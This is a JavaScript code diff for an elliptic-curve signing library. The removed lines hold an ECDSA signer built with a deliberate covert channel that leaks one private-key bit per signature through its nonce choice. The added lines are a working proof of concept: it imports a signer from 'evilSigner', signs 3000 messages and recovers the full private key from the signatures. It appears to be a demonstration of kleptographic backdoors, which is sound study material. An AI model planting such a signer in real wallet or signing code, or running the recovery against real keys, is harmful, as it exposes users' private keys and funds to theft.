@@ -1,61 +1,55 @@
-import { keccak256Uint32, keccak256Uint32ToHex } from "../../crypto/sha3";
 import bigints from "../../util/bigints";
-import { inverse } from "../modular";
-import { G, Point, Q } from "../secp256k1";
-
-const SaltedBuff = new Uint8Array(64);
-new TextEncoder().encodeInto("Secret salt", SaltedBuff);
+import { sha256Uint32 } from "../sha2";
+import { sign } from "./evilSigner";
 
 /**
- * @param {bigint} r
- * @param {boolean} revealedBit
- * @return {boolean}
- */
-const secretPredicate = (r, revealedBit) => {
-  SaltedBuff.fill(0, 32, 64);
-  bigints.intoBytesBE(SaltedBuff, 64, r);
-  return (keccak256Uint32(new Uint32Array(SaltedBuff.buffer))[0] & 1) != revealedBit;
-}
-
-/**
- * @param {bigint} digest
- * @param {bigint} privKey
- * @return {{
+ * @param {!Array<{
  *   r: bigint,
- *   s: bigint,
- *   yParity: boolean
- * }}
+ *   digest: !Uint8Array
+ * }>} signatures
+ * @return {bigint}
  */
-const sign = (digest, privKey) => {
-  // The signature will covertly encode the revealIdx'th bit of the private key.
-  const revealedIdx = 256n - (digest >> 248n);
-  const revealedBit = !!((privKey >> revealedIdx) & 1n);
+const recoverPrivateKey = (signatures) => {
+  const SaltedBuff = new Uint8Array(64);
+  new TextEncoder().encodeInto("Secret salt 1234abcd", SaltedBuff);
 
-  const kBuff = new Uint8Array(64);
-  bigints.intoBytesBE(kBuff, 32, digest);
-  bigints.intoBytesBE(kBuff, 64, privKey);
-  /** @type {bigint} */
-  let k = BigInt("0x" + keccak256Uint32ToHex(new Uint32Array(kBuff.buffer)));
-
-  for (; ; ++k) {
-    /** @type {!Point} */
-    const K = G.copy().multiply(k).project();
-    /** @const {bigint} */
-    const r = K.x;
-    if (r >= Q || revealedBit && secretPredicate(r, revealedBit)) continue;
-    /** @type {bigint} */
-    let s = (inverse(k, Q) * ((digest + r * privKey) % Q)) % Q;
-    if (s == 0n) continue;
-    /** @type {boolean} */
-    let yParity = !!(K.y & 1n);
-    if (s > (Q >> 1n)) {
-      s = Q - s;
-      yParity = !yParity;
-    }
-    return { r, s, yParity }
+  const bits = Array(256).fill(true);
+  for (const { r, digest } of signatures) {
+    const revealedIdx = digest[0];
+    SaltedBuff.fill(0, 32, bigints.intoBytesBE(SaltedBuff, 64, r));
+    bits[revealedIdx] &= sha256Uint32(new Uint32Array(SaltedBuff.buffer))[0] & 1;
   }
+
+  let pk = 0n;
+  for (let i = 0; i < 256; ++i) {
+    pk *= 2n;
+    if (bits[i]) ++pk;
+  }
+
+  return pk;
 }
 
-export {
-  sign
-};
+const signer = async (privKey) => {
+  /** @const {!Array<{r: bigint, digest: !Uint8Array}>} */
+  const signatures = [];
+
+  // The wallet signs 3000 messages. By the random oracle assumption, the digests are
+  // distributed uniformly at random and independently of each other.
+  // Assume the signatures are publicly available on a blockchain.
+  for (let i = 0; i < 3000; ++i) {
+    const digest = /** @type {!Uint8Array} */(crypto.getRandomValues(new Uint8Array(32)));
+    const { r } = await sign(digest, privKey);
+    signatures.push({ r, digest });
+  }
+
+  return signatures;
+}
+
+const privKey = bigints.fromBytesBE(
+    /** @type {!Uint8Array} */(crypto.getRandomValues(new Uint8Array(32))));
+
+signer(privKey).then((signatures) => {
+  const recoveredPrivKey = recoverPrivateKey(signatures);
+  console.log("Signer's private key:\t", privKey.toString(16));
+  console.log("Recovered private key:\t", recoveredPrivKey.toString(16));
+});
